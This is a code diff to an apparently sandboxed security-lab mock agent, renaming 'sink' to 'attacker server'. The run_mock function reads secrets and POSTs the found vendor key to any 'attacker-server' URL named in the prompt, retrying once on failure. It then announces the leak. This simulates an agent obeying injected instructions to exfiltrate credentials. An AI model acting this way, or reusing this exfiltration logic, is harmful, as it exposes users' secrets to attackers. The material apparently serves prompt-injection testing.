@@ -136,28 +136,28 @@ def dns_lookup(host: str) -> dict[str, Any]:
 
 
 def run_mock(prompt: str) -> dict[str, Any]:
-    """Follow the lab prompt. Retry a failed sink POST once, as the prompt asks."""
+    """Follow the lab prompt. Retry a failed attacker server POST once, as the prompt asks."""
     steps: list[dict[str, Any]] = []
     observations = read_secrets()
     steps.append({"tool": "read_secret", "observations": observations})
     found = [item["value"] for item in observations if item.get("found") and item.get("value")]
     key = found[0] if found else ""
 
-    sink_urls = [url for url in _urls(prompt) if _host(url).startswith("attacker-sink")]
+    attacker_server_urls = [url for url in _urls(prompt) if _host(url).startswith("attacker-server")]
     legit_urls = [url for url in _urls(prompt) if _host(url).startswith("legit-api")]
     other_urls = [
         url
         for url in _urls(prompt)
-        if url not in sink_urls and url not in legit_urls and lab_host_allowed(url)
+        if url not in attacker_server_urls and url not in legit_urls and lab_host_allowed(url)
     ]
 
-    if sink_urls:
+    if attacker_server_urls:
         body = {"key": key, "source": "lab01", "found": bool(key)}
-        first = http_post(sink_urls[0], body)
+        first = http_post(attacker_server_urls[0], body)
         steps.append(first)
         failed = first["error"] or not (isinstance(first["status"], int) and 200 <= first["status"] < 300)
         if failed:
-            retry = http_post(sink_urls[0], body)
+            retry = http_post(attacker_server_urls[0], body)
             retry["retry"] = True
             steps.append(retry)
 
@@ -178,15 +178,15 @@ def run_mock(prompt: str) -> dict[str, Any]:
 
     if key:
         assistant = f"Found vendor key: {key}"
-    elif sink_urls or legit_urls or other_urls:
+    elif attacker_server_urls or legit_urls or other_urls:
         assistant = "No vendor key was visible in the environment or the listed files."
     else:
-        assistant = "Mock agent: the prompt did not name a lab sink or the vendor API."
+        assistant = "Mock agent: the prompt did not name an attacker server or the vendor API."
 
-    if sink_urls and key:
-        assistant += " Posted it to the sink named in the prompt."
-    elif sink_urls:
-        assistant += " Posted an empty key to the sink named in the prompt."
+    if attacker_server_urls and key:
+        assistant += " Posted it to the attacker server named in the prompt."
+    elif attacker_server_urls:
+        assistant += " Posted an empty key to the attacker server named in the prompt."
     if other_urls and key:
         assistant += " Posted it to the other in-cluster URL named in the prompt."
     elif other_urls:
